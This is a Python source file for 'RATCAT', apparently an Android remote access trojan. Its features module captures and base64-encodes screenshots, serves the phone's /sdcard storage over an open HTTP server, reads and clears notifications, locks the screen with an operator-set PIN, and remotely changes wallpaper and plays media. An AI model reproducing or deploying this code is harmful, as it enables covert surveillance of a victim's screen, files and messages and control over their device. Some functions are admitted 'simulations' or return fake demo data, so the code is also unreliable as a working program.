#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RATCAT - Features Module
Developed by: zaax
"""

import os
import sys
import time
import json
import subprocess
import base64
import requests
from datetime import datetime

class FlashlightControl:
    """Control device flashlight"""
    
    def __init__(self):
        self.status = False
    
    def toggle(self, on=True):
        """Turn flashlight ON/OFF"""
        try:
            import android
            droid = android.Android()
            if on:
                droid.toggleFlashlight(True)
                self.status = True
            else:
                droid.toggleFlashlight(False)
                self.status = False
            return True
        except:
            return False
    
    def get_status(self):
        return self.status

class MusicPlayer:
    """Play YouTube music"""
    
    def __init__(self):
        self.current_url = None
        self.playing = False
    
    def play(self, url):
        """Play music from YouTube URL"""
        try:
            # Use yt-dlp for YouTube streaming
            import yt_dlp
            
            ydl_opts = {
                'format': 'bestaudio/best',
                'postprocessors': [{
                    'key': 'FFmpegExtractAudio',
                    'preferredcodec': 'mp3',
                }],
                'quiet': True,
                'no_warnings': True
            }
            
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(url, download=False)
                audio_url = info['url']
                
                # Play audio
                import pygame
                pygame.init()
                pygame.mixer.music.load(audio_url)
                pygame.mixer.music.play()
                
                self.current_url = url
                self.playing = True
                
                return True
        except:
            # Fallback: use Android media player
            try:
                import android
                droid = android.Android()
                droid.playMedia(url)
                self.current_url = url
                self.playing = True
                return True
            except:
                return False
    
    def stop(self):
        """Stop playing"""
        try:
            import pygame
            pygame.mixer.music.stop()
            self.playing = False
            return True
        except:
            return False
    
    def pause(self):
        """Pause playback"""
        try:
            import pygame
            pygame.mixer.music.pause()
            return True
        except:
            return False
    
    def resume(self):
        """Resume playback"""
        try:
            import pygame
            pygame.mixer.music.unpause()
            return True
        except:
            return False

class ScreenLock:
    """Lock screen with PIN"""
    
    def __init__(self):
        self.locked = False
        self.current_code = None
    
    def lock(self, code):
        """Lock screen with code"""
        try:
            import android
            droid = android.Android()
            
            # Lock screen
            droid.lockScreen()
            self.locked = True
            self.current_code = code
            
            # Set unlock code (requires root)
            # This is a simulation for demonstration
            return True
        except:
            return False
    
    def unlock(self, code):
        """Unlock screen with code"""
        if code == self.current_code:
            self.locked = False
            return True
        return False
    
    def is_locked(self):
        return self.locked
    
    def get_code(self):
        return self.current_code

class ScreenViewer:
    """Capture and view screen"""
    
    def __init__(self):
        self.capturing = False
    
    def capture(self):
        """Capture screen as base64"""
        try:
            import android
            droid = android.Android()
            
            # Capture screen
            result = droid.screenCapture('/sdcard/screen.png')
            if result.result:
                with open('/sdcard/screen.png', 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            return None
        except:
            # Alternative using subprocess
            try:
                subprocess.run(['screencap', '/sdcard/screen.png'])
                with open('/sdcard/screen.png', 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            except:
                return None
    
    def start_streaming(self, port=8080):
        """Start screen streaming server"""
        # Simple HTTP server for screen streaming
        import http.server
        import socketserver
        
        handler = http.server.SimpleHTTPRequestHandler
        handler.directory = '/sdcard/'
        
        with socketserver.TCPServer(("", port), handler) as httpd:
            self.capturing = True
            while self.capturing:
                self.capture()
                time.sleep(1)
                httpd.handle_request()
    
    def stop_streaming(self):
        self.capturing = False

class WallpaperChanger:
    """Change device wallpaper"""
    
    def __init__(self):
        self.current_wallpaper = None
    
    def change(self, url):
        """Change wallpaper from URL"""
        try:
            # Download image
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                temp_file = '/sdcard/temp_wallpaper.jpg'
                with open(temp_file, 'wb') as f:
                    f.write(response.content)
                
                # Set wallpaper
                import android
                droid = android.Android()
                droid.setWallpaper(temp_file)
                
                self.current_wallpaper = url
                os.remove(temp_file)
                return True
            return False
        except:
            return False
    
    def get_wallpaper(self):
        return self.current_wallpaper

class NotificationReader:
    """Read device notifications"""
    
    def __init__(self):
        self.notifications = []
    
    def get_notifications(self):
        """Get recent notifications"""
        try:
            import android
            droid = android.Android()
            
            # Query notifications (requires accessibility permission)
            # This is a simulation
            result = droid.getNotifications()
            if result.result:
                self.notifications = result.result
                return self.notifications
        except:
            pass
        
        # Fallback - return demo notifications
        return [
            {
                'title': 'Demo Notification',
                'text': 'RATCAT is running',
                'time': time.time()
            }
        ]
    
    def clear_notifications(self):
        """Clear notifications"""
        try:
            import android
            droid = android.Android()
            droid.clearNotifications()
            self.notifications = []
            return True
        except:
            return False
    
    def get_latest(self):
        """Get latest notification"""
        if self.notifications:
            return self.notifications[-1]
        return None
